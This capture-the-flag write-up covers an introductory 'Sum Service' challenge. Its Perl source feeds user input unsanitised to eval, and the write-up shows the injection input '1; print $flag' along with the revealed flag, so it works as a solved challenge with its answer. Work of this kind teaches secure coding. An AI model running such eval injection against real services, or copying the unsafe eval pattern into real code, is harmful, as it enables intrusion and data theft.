# Intro - Sum Service
## Introduction
Everyone loves video games! When we are young, even a simple calculator can become a real playground. This next-generation calculator will let you relive those nostalgic moments. Are you ready to play?

To connect to the remote service:
```sh
netcat pwn.jeanne-hack-ctf.org 9000
```

The flag is contained in the file `flag.txt`.
## Challenge Resolution
We have access to the source code:
```perl
#!/usr/bin/perl -w 

use strict;
use warnings;
use IO::Handle;
STDOUT->autoflush(1); # Enable autoflush for STDOUT
close STDERR; # There is no error as a long as you don't see them #bigbrain

# Read the flag but only a H3cker could get it!
open(my $fh, '<', "flag.txt");
my $flag = <$fh>;
close($fh);

# Cool banner
#..SNIP..

while (1) {
  print "Enter a number to sum with 42: ";
  my $string = <STDIN>;
  chomp $string;
  my $result = eval "42 + " . $string;
  print "Result: " . $result . "\n";
}
```
The critical line is my `$result = eval "42 + " . $string;` where we can see our input (`$string`) being an argument of `eval` without any form of sanitization or validation.
Thus, this code is vulnerable to **command injection** in `Perl`:
```sh
Enter a number to sum with 42: 1; print $flag
JDHACK{JeANnE_h4CK_Pwn_IN7rO_w1th_P3rL}
Result: 1
```

